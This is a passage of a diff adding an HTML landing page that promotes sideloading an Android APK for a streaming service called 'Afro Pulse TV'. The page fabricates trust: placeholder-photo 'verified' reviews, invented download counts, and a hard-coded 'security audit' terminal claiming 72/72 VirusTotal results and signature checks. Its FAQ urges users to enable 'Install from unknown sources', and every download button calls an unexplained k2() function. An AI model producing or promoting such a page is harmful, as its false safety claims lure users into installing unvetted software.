+            <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          </div>
+          <p><b>50M+</b> downloads · <b>10K+</b> titles</p>
+        </div>
+      </div>
+      <div class="rev-masonry">
+        <article class="rev-card reveal">
+          <div class="qmark">“</div>
+          <p class="rev-text" data-i18n="review1">"Finally an app that actually delivers. The 4K quality is insane and offline downloads saved my commute. Cancelled everything else."</p>
+          <div class="rev-stars"><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg></div>
+          <div class="rev-who"><div class="rev-av"><img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Sarah Mitchell" loading="lazy"></div><div class="rev-name">Sarah Mitchell<span>✓ <span class="v" data-i18n="verified_user">Verified User</span></span></div></div>
+        </article>
+        <article class="rev-card reveal" data-d="1">
+          <div class="qmark">“</div>
+          <p class="rev-text" data-i18n="review2">"Multi-device sync is flawless. I start on my TV, finish on my phone in bed. The library is massive and the AI recommendations are scary good."</p>
+          <div class="rev-stars"><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg></div>
+          <div class="rev-who"><div class="rev-av"><img src="https://randomuser.me/api/portraits/men/32.jpg" alt="James Rodriguez" loading="lazy"></div><div class="rev-name">James Rodriguez<span>✓ <span class="v" data-i18n="verified_user">Verified User</span></span></div></div>
+        </article>
+        <div class="rev-break reveal" data-d="2">
+          <h4>Rating breakdown</h4>
+          <div class="rev-bar-row"><span class="lb">5 ★</span><div class="rev-bar"><i style="width:82%"></i></div><span class="pct">82%</span></div>
+          <div class="rev-bar-row"><span class="lb">4 ★</span><div class="rev-bar"><i style="width:12%"></i></div><span class="pct">12%</span></div>
+          <div class="rev-bar-row"><span class="lb">3 ★</span><div class="rev-bar"><i style="width:4%"></i></div><span class="pct">4%</span></div>
+          <div class="rev-bar-row"><span class="lb">2 ★</span><div class="rev-bar"><i style="width:1%"></i></div><span class="pct">1%</span></div>
+          <div class="rev-bar-row"><span class="lb">1 ★</span><div class="rev-bar"><i style="width:1%"></i></div><span class="pct">1%</span></div>
+        </div>
+        <article class="rev-card reveal" data-d="3">
+          <div class="qmark">“</div>
+          <p class="rev-text" data-i18n="review3">"Kids Mode is a lifesaver. My children have their own space and I don't worry about what they'll find. Best streaming app for families hands down."</p>
+          <div class="rev-stars"><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg></div>
+          <div class="rev-who"><div class="rev-av"><img src="https://randomuser.me/api/portraits/women/23.jpg" alt="Emily Chen" loading="lazy"></div><div class="rev-name">Emily Chen<span>✓ <span class="v" data-i18n="verified_user">Verified User</span></span></div></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================
+       SECURITY — terminal scan report
+       ============================================================ -->
+  <section class="sec">
+    <div class="container">
+      <header class="sec-head reveal">
+        <div class="eyebrow" data-i18n="sec_label">Safe &amp; Verified</div>
+        <h2 class="h2"><span data-i18n="sec_h_a">Your security</span> <span class="grad-text" data-i18n="sec_h_b">is our priority</span></h2>
+        <p class="sub" data-i18n="sec_sub">Every release is scanned, signed, and verified before it reaches you.</p>
+      </header>
+      <div class="sec-terminal reveal">
+        <div class="term-bar"><span class="td r"></span><span class="td y"></span><span class="td g"></span><span class="term-title">Afro Pulse tv — security audit · v5.6</span></div>
+        <div class="term-body">
+          <div class="term-line"><span class="prompt">$</span> Afro Pulse  verify <span class="arg">build-5.6.apk</span></div>
+          <div class="term-line ok">✓ SHA-256 signature <span class="tag">VALID</span> <span class="desc">· cryptographically verified</span></div>
+          <div class="term-line ok">✓ VirusTotal <span class="tag">72/72 CLEAN</span> <span class="desc">· 0 detections</span></div>
+          <div class="term-line ok">✓ Permissions audit <span class="tag">MINIMAL</span> <span class="desc">· only what's needed</span></div>
+          <div class="term-line ok">✓ Update channel <span class="tag">SECURE</span> <span class="desc">· auto-update enabled</span></div>
+          <div class="term-line dim">Scanning release manifest<span class="term-cursor"></span></div>
+        </div>
+      </div>
+      <div class="sec-badges">
+        <div class="sec-badge reveal" data-d="1"><div class="sb-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></div><div><b data-i18n="sec1_a">VirusTotal Scanned</b><span data-i18n="sec1_b">100% clean · 72 engines passed</span></div></div>
+        <div class="sec-badge reveal" data-d="2"><div class="sb-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></div><div><b data-i18n="sec2_a">SHA-256 Signed</b><span data-i18n="sec2_b">Cryptographically verified · tamper-proof</span></div></div>
+        <div class="sec-badge reveal" data-d="3"><div class="sb-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2v6h-6"/><path d="M21 8a9 9 0 10-3 5"/></svg></div><div><b data-i18n="sec3_a">Auto-Update</b><span data-i18n="sec3_b">Get the latest version as soon as we release</span></div></div>
+        <div class="sec-badge reveal" data-d="4"><div class="sb-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg></div><div><b data-i18n="sec4_a">No Permissions Abuse</b><span data-i18n="sec4_b">Only requests what's strictly needed</span></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================
+       DOWNLOAD — split panel + phone mock
+       ============================================================ -->
+  <section class="sec" id="download">
+    <div class="container">
+      <div class="dl-panel reveal">
+        <div class="dl-copy">
+          <div class="dl-logo"><img src="img/logo.jpg" alt="Afro Pulse TV logo"></div>
+          <h2><span data-i18n="hero_title_a">Cinema in your</span> <em data-i18n="hero_title_b">pocket</em></h2>
+          <p data-i18n="hero_desc">Stream blockbusters, watch live TV, download for offline — all in stunning 4K HDR. No ads. Ever.</p>
+          <div class="dl-trust">
+            <span class="ti"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>Official Android Package</span>
+            <span class="ti"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>Latest Stable Build</span>
+            <span class="ti"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>One-Tap Install</span>
+          </div>
+          <div class="dl-actions">
+            <button class="btn btn-primary btn-lg" onclick="k2()">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+              <span data-i18n="hero_cta">Download Free </span>
+            </button>
+            <a class="dl-backup" onclick="k2()">Backup Download Entry</a>
+          </div>
+          <div class="dl-note"><b data-i18n="sec1_a">VirusTotal Scanned</b> · 100% clean · v5.6</div>
+        </div>
+        <div class="dl-phone" aria-hidden="true">
+          <div class="phone">
+            <div class="phone-notch"></div>
+            <div class="phone-screen">
+              <div class="ps-bar"><b>Afro Pulse TV</b><span class="ps-live"><i></i>LIVE</span></div>
+              <div class="ps-grid">
+                <div class="ps-card"><img src="img/1a.png" alt=""></div>
+                <div class="ps-card"><img src="img/2a.png" alt=""></div>
+                <div class="ps-card"><img src="img/3a.png" alt=""></div>
+                <div class="ps-card"><img src="img/4a.png" alt=""><span class="ps-badge">4K</span></div>
+              </div>
+              <div class="ps-playbar"><div class="pb-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg></div><div class="pb-track"><i></i></div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================
+       FAQ — left intro + right accordion
+       ============================================================ -->
+  <section class="sec" id="faq">
+    <div class="container">
+      <div class="faq-grid">
+        <div class="faq-intro reveal">
+          <div class="eyebrow" data-i18n="faq_label">FAQ</div>
+          <h2><span data-i18n="faq_h_a">Got questions?</span><br><span class="grad-text" data-i18n="faq_h_b">We've got answers.</span></h2>
+          <p>Everything you need to know about downloading, installing, and staying up to date with Afro Pulse TV.</p>
+          <div class="faq-note">
+            <div class="faq-note-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.5 8.5 0 01-8.5 8.5 8.4 8.4 0 01-3.5-.75L3 21l1.75-6A8.5 8.5 0 1121 11.5z"/></svg></div>
+            <div>
+              <b>Still stuck?</b>
+              <span>Our support team replies in under 2 hours, 7 days a week.</span>
+            </div>
+          </div>
+          <a class="faq-support" onclick="k2()">Get the app
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+          </a>
+        </div>
+        <div class="faq-list">
+          <div class="faq-item reveal"><button class="faq-q" onclick="toggleFaq(this)"><span class="faq-num">01</span><span class="faq-qt" data-i18n="faq1_q">Is the APK safe to install?</span><span class="faq-plus"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq1_a">Absolutely. Every release goes through VirusTotal scanning (72+ engines), SHA-256 code signing, and manual security review before publication. We never bundle adware, spyware, or unwanted software. You can verify the signature yourself using the hash published on our security page.</p></div></div>
+          <div class="faq-item reveal" data-d="1"><button class="faq-q" onclick="toggleFaq(this)"><span class="faq-num">02</span><span class="faq-qt" data-i18n="faq2_q">Why isn't the app on Google Play or App Store?</span><span class="faq-plus"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq2_a">We're currently in a rapid iteration phase — shipping updates every 2 weeks with new features and improvements. Direct distribution lets us move faster without app store review delays. App store listings are planned for late 2026 once we hit our feature-complete milestone. Same app, same quality, just faster updates for you.</p></div></div>
+          <div class="faq-item reveal" data-d="1"><button class="faq-q" onclick="toggleFaq(this)"><span class="faq-num">03</span><span class="faq-qt" data-i18n="faq3_q">How do I install the APK on Android?</span><span class="faq-plus"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq3_a">1. Tap the Download APK button above.<br>2. Open the downloaded .apk file.<br>3. If prompted, allow "Install from unknown sources" in Settings → Security.<br>4. Tap Install and you're done! The app will auto-update itself after that — no need to manually download future versions.</p></div></div>
+          <div class="faq-item reveal" data-d="2"><button class="faq-q" onclick="toggleFaq(this)"><span class="faq-num">04</span><span class="faq-qt" data-i18n="faq4_q">Is it really free? What's the catch?</span><span class="faq-plus"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq4_a">Yes — 100% free. No hidden fees, no forced subscriptions, no paywalls on content. We're building our user base and believe that if we make the best streaming experience, growth follows. Premium features (like offline downloads and 4K) are also free during our launch period. Enjoy it while it lasts!</p></div></div>
+          <div class="faq-item reveal" data-d="2"><button class="faq-q" onclick="toggleFaq(this)"><span class="faq-num">05</span><span class="faq-qt" data-i18n="faq5_q">Which devices and OS versions are supported?</span><span class="faq-plus"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq5_a">Android 8.0 (Oreo) and above for the APK. iOS 14+ for the IPA. Works on phones, tablets, Android TV, and Fire TV Stick. We recommend at least 2 GB of RAM for the best 4K streaming experience. Chromecast and AirPlay support are built in.</p></div></div>
+          <div class="faq-item reveal" data-d="3"><button class="faq-q" onclick="toggleFaq(this)"><span class="faq-num">06</span><span class="faq-qt" data-i18n="faq6_q">How do I get updates after installing?</span><span class="faq-plus"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq6_a">The app has a built-in auto-updater. When a new version is available, you'll get a notification inside the app — just tap "Update" and it handles everything. No need to revisit this page or manually download again. We push updates every ~2 weeks with fixes and new features.</p></div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- ============================================================
+     FOOTER
+     ============================================================ -->
+<footer class="footer">
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-col">
+        <div class="foot-brand"><img src="img/logo.jpg" alt="Afro Pulse TV logo"><b>Afro Pulse <em>TV</em></b></div>
+        <p>Cinema in your pocket. Stream blockbusters, watch live TV, and download for offline in 4K HDR — no ads, ever.</p>
+      </div>
+      <div class="foot-col">
+        <h4>Product</h4>
+        <ul>
+          <li><a href="#trending">Trending</a></li>
+          <li><a href="#live">Live TV</a></li>
+          <li><a href="#features">Features</a></li>
+          <li><a href="#download">Download</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>Legal</h4>
+        <ul>
+          <li><a href="#" data-i18n="footer_priv">Privacy</a></li>
+          <li><a href="#" data-i18n="footer_terms">Terms</a></li>
+          <li><a href="#" data-i18n="footer_sec">Security</a></li>
+          <li><a href="#faq">Support</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      <span data-i18n="footer_copy">© 2026 Afro Pulse TV</span>
+      <span class="foot-ver">Version v5.6</span>
+    </div>
+  </div>
+</footer>
+
+<!-- ============================================================
+     FLOATING DOWNLOAD PILL
+     ============================================================ -->
+<div class="floatbar" id="floatbar">
+  <div class="floatbar-icon"><img src="img/logo.jpg" alt="Afro Pulse TV logo"></div>
+  <div class="floatbar-meta">
+    <div class="floatbar-name">Afro Pulse TV</div>
+    <div class="floatbar-sub"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>4.8 · 50M+</div>
+  </div>
+  <button class="floatbar-btn" onclick="k2()" data-i18n="float_cta">Download Free</button>
+</div>
+
+<!-- mobile floating download button -->
+<div class="mobile-fab" aria-label="Download">
+  <button onclick="k2()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+    <span data-i18n="float_cta">Download Free</span>
+  </button>
+</div>
+
+
+<script>
+/* ---- FAQ ---- */
+function toggleFaq(q){var p=q.closest('.faq-item');var was=p.classList.contains('open');document.querySelectorAll('.faq-item').forEach(function(i){i.classList.remove('open')});if(!was)p.classList.add('open')}
+
+/* ---- nav scroll state ---- */
+(function(){
+  var nav=document.getElementById('nav');
+  function onScroll(){ nav.classList.toggle('scrolled', window.scrollY > 10); }
+  window.addEventListener('scroll', onScroll, {passive:true}); onScroll();
+})();
+
+/* ---- floating pill ---- */
+(function(){
+  var fb=document.getElementById('floatbar');
+  function onScroll(){ fb.classList.toggle('show', window.scrollY > window.innerHeight * 0.7); }
+  window.addEventListener('scroll', onScroll, {passive:true}); onScroll();
+})();
+
+/* ---- reveal on scroll ---- */
+(function(){
+  if(!('IntersectionObserver' in window)){ document.querySelectorAll('.reveal').forEach(function(el){el.classList.add('in')}); return; }
+  var io=new IntersectionObserver(function(es){ es.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target); } }); },{threshold:0.12, rootMargin:'0px 0px -8% 0px'});
+  document.querySelectorAll('.reveal').forEach(function(el){ io.observe(el); });
+})();
+
+/* ---- count up ---- */
+(function(){
+  function run(el){
+    var target=parseFloat(el.getAttribute('data-count'));
+    var dec=parseInt(el.getAttribute('data-dec')||'0',10);
+    var suffix=el.getAttribute('data-suffix')||'';
+    var start=null, dur=1500;
+    function step(ts){ if(!start)start=ts; var p=Math.min((ts-start)/dur,1); var eased=1-Math.pow(1-p,3); var val=target*eased; el.textContent=(dec?val.toFixed(dec):Math.round(val))+suffix; if(p<1)requestAnimationFrame(step); }
+    requestAnimationFrame(step);
+  }
+  if(!('IntersectionObserver' in window)){ document.querySelectorAll('[data-count]').forEach(run); return; }
+  var io=new IntersectionObserver(function(es){ es.forEach(function(e){ if(e.isIntersecting){ run(e.target); io.unobserve(e.target); } }); },{threshold:0.6});
+  document.querySelectorAll('[data-count]').forEach(function(el){ io.observe(el); });
+})();
+</script>
+
+<script>
+/* ============================================================
+   i18n
+   ============================================================ */
+(function(){
+var T={
+en:{
+hero_eyebrow:'#1 Entertainment App · 2026',hero_title_a:'Cinema in your',hero_title_b:'pocket',hero_desc:'Stream blockbusters, watch live TV, download for offline — all in stunning 4K HDR. No ads. Ever.',hero_stat1:'Active Users',hero_stat2:'App Store',hero_stat3:'Quality',hero_cta:'Download Free',scroll_hint:'Swipe',trending_label:'Trending Now',trending_h_a:'What the world',trending_h_b:'is watching',trending_sub:'Top picks, updated daily',card_hot:'HOT',card_new:'NEW',card_top:'TOP',card_4k:'4K',card_hd:'HD',live_titles:'Titles',live_rating:'Rating',live_downloads:'Downloads',feat_label:'Why Afro Pulse TV',feat_h_a:'Everything you',feat_h_b:"need. Nothing you don't.",feat1_h:'4K HDR',feat1_p:'Dolby Vision & Atmos. Cinema-grade quality in your hands.',feat2_h:'Offline Mode',feat2_p:'Download anything. Watch on planes, trains, anywhere.',feat3_h:'Multi-Device',feat3_p:'Phone, tablet, TV — pause on one, resume on another.',feat4_h:'Early Access',feat4_p:'Exclusive premieres & behind-the-scenes 